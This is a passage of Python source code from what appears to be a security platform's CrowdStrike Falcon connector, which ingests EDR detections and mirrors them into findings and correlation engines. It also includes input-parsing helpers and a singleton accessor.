                        _hn = parsed["hostname"]
                        if _hn not in _endpoint_cache:
                            _endpoint_cache[_hn] = self._ensure_endpoint(org_id, _hn)
                        endpoint_id = _endpoint_cache[_hn]
                        self._edr.ingest_process_event(
                            org_id, endpoint_id, _to_edr_event(parsed)
                        )
                        edr_count += 1
                    except (ValueError, TypeError, AttributeError) as exc:
                        _logger.warning("EDR ingest failed for %s: %s", parsed["detection_id"], exc)
                # Mirror to SecurityFindingsEngine.
                if self._findings is not None:
                    try:
                        self._findings.record_finding(
                            org_id=org_id,
                            title=parsed["title"][:200],
                            finding_type="anomaly",
                            source_tool="EDR",  # canonical bucket; vendor in correlation_key
                            severity=parsed["severity"]
                                if parsed["severity"] != "informational" else "low",
                            cvss_score=parsed["cvss_score"],
                            asset_id=parsed["asset_id"][:200],
                            asset_type=parsed["asset_type"],
                            description=(parsed["description"]
                                         + (f" | cmd: {parsed['cmdline']}" if parsed["cmdline"] else ""))[:500],
                            remediation=(
                                "Investigate the Falcon detection in the SOC console; "
                                "isolate the endpoint via /api/v1/edr/endpoints/{id}/isolate "
                                "if confirmed malicious."
                            ),
                            correlation_key=f"crowdstrike_falcon|{parsed['detection_id']}",
                        )
                        findings += 1
                    except (ValueError, TypeError, AttributeError) as exc:
                        _logger.warning("Finding record failed for %s: %s",
                                        parsed["detection_id"], exc)
                # Mirror to correlation engine.
                if self._correlation is not None:
                    try:
                        self._correlation.ingest_event(
                            org_id,
                            {
                                "source_system": "crowdstrike_falcon",
                                "event_type":    "edr_detection",
                                "severity":      parsed["severity"]
                                    if parsed["severity"] in {"critical", "high",
                                                              "medium", "low", "info"}
                                    else "medium",
                                "entity_id":     parsed["asset_id"],
                                "entity_type":   parsed["asset_type"],
                                "raw_data": {
                                    "detection_id":    parsed["detection_id"],
                                    "detect_name":     parsed["detect_name"],
                                    "technique":       parsed["technique"],
                                    "tactic":          parsed["tactic"],
                                    "mitre_technique": parsed["mitre_technique"],
                                    "mitre_tactic":    parsed["mitre_tactic"],
                                    "sha256":          parsed["sha256"],
                                    "user":            parsed["user"],
                                    "hostname":        parsed["hostname"],
                                },
                            },
                        )
                        corr_count += 1
                    except (ValueError, TypeError, AttributeError) as exc:
                        _logger.warning("Correlation mirror failed for %s: %s",
                                        parsed["detection_id"], exc)

        emit_connector_event(
            connector="CrowdStrikeFalconConnector",
            org_id=org_id,
            source_kind="edr",
            finding_count=findings,
            extra={
                "ingested": ingested,
                "failed": failed,
                "edr_events": edr_count,
                "correlation_events": corr_count,
                "detection_count": len(detection_ids),
            },
        )
        return {
            "mode":               "live",
            "org_id":             org_id,
            "events_processed":   len(events),
            "ingested":           ingested,
            "failed":             failed,
            "findings_recorded":  findings,
            "edr_events":         edr_count,
            "correlation_events": corr_count,
            "detection_ids":      detection_ids,
        }

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    def _extract_events(
        self,
        json_dump: Union[str, bytes, Path, List[Dict[str, Any]], Dict[str, Any]],
    ) -> List[Dict[str, Any]]:
        """Normalize many input shapes into a list of detection dicts.

        Supports:
          * Python list  → returned as-is (filtered to dicts)
          * Python dict  → wrapped in [dict], or unwrapped if it has
                           ``{"resources": [...]}`` (Falcon REST API shape)
          * str/bytes    → tried as JSON; if that fails, tried as NDJSON
          * Path-like    → file is read; same str heuristic applied
        """
        if isinstance(json_dump, list):
            return [e for e in json_dump if isinstance(e, dict)]
        if isinstance(json_dump, dict):
            # Falcon REST API: {"resources": [...]}
            if isinstance(json_dump.get("resources"), list):
                return [e for e in json_dump["resources"] if isinstance(e, dict)]
            return [json_dump]
        if isinstance(json_dump, (str, bytes, bytearray)):
            text = json_dump.decode("utf-8") if isinstance(json_dump, (bytes, bytearray)) else json_dump
            text = text.strip()
            if not text:
                return []
            # Single JSON value first.
            try:
                obj = json.loads(text)
                return self._extract_events(obj)
            except (json.JSONDecodeError, ValueError):
                pass
            # NDJSON fallback.
            events: List[Dict[str, Any]] = []
            for line in text.splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    parsed = json.loads(line)
                except (json.JSONDecodeError, ValueError):
                    continue
                if isinstance(parsed, list):
                    events.extend(p for p in parsed if isinstance(p, dict))
                elif isinstance(parsed, dict):
                    events.append(parsed)
            return events
        # Path-like
        try:
            path = Path(json_dump)  # type: ignore[arg-type]
        except TypeError as exc:
            raise ValueError(f"unsupported json_dump type: {type(json_dump).__name__}") from exc
        if not path.is_file():
            raise FileNotFoundError(f"falcon dump file not found: {path}")
        return self._extract_events(path.read_text(encoding="utf-8"))

    def _ensure_endpoint(self, org_id: str, hostname: str) -> str:
        """Find or create an EDR endpoint record. Returns the endpoint_id."""
        for ep in self._edr.list_endpoints(org_id):
            if ep.get("hostname") == hostname:
                return ep["endpoint_id"]
        rec = self._edr.register_endpoint(
            org_id,
            {
                "hostname":      hostname,
                "ip_address":    "",
                "os_type":       "windows",
                "os_version":    "falcon-managed",
                "agent_version": "crowdstrike-falcon-via-aldeci-connector",
            },
        )
        return rec["endpoint_id"]

    # ------------------------------------------------------------------
    # Convenience for demos / tests
    # ------------------------------------------------------------------
    def ingest_sample(self, org_id: str) -> Dict[str, Any]:
        """Ingest the embedded 10-detection sample for an org. For demos."""
        return self.ingest_falcon_dump(FALCON_SAMPLE_DETECTIONS, org_id=org_id)


# ---------------------------------------------------------------------------
# Lazy module-level singleton accessor
# ---------------------------------------------------------------------------
_singleton_lock = threading.Lock()
_singleton: Optional[CrowdStrikeFalconConnector] = None


def get_falcon_connector() -> CrowdStrikeFalconConnector:
    """Lazy singleton — wires EDREngine + SecurityFindingsEngine + correlation on first use."""
    global _singleton
    with _singleton_lock:
        if _singleton is None:
            edr = None
            findings = None
            corr = None
            try:
                from core.edr_engine import EDREngine
                edr = EDREngine()
            except (ImportError, RuntimeError, OSError) as exc:
                _logger.warning("EDREngine unavailable for Falcon connector: %s", exc)
            try:
                from core.security_findings_engine import SecurityFindingsEngine
                findings = SecurityFindingsEngine()
            except (ImportError, RuntimeError, OSError) as exc:
                _logger.warning("SecurityFindingsEngine unavailable for Falcon connector: %s", exc)
            try:
                from core.security_event_correlation_engine import (
                    SecurityEventCorrelationEngine,
                )
                corr = SecurityEventCorrelationEngine()
            except (ImportError, RuntimeError, OSError) as exc:
                _logger.warning("SecurityEventCorrelationEngine unavailable for Falcon connector: %s", exc)
            _singleton = CrowdStrikeFalconConnector(
                edr_engine=edr,
                findings_engine=findings,
                correlation_engine=corr,
            )
        return _singleton


__all__ = [
    "CrowdStrikeFalconConnector",
    "get_falcon_connector",
    "parse_event",
    "falcon_severity_to_aldeci",
    "falcon_severity_to_cvss",
    "falcon_technique_to_mitre",
    "falcon_tactic_to_mitre",
    "FALCON_SAMPLE_DETECTIONS",
    "_FALCON_TECHNIQUE_TO_MITRE",
    "_FALCON_TACTIC_TO_MITRE",
]
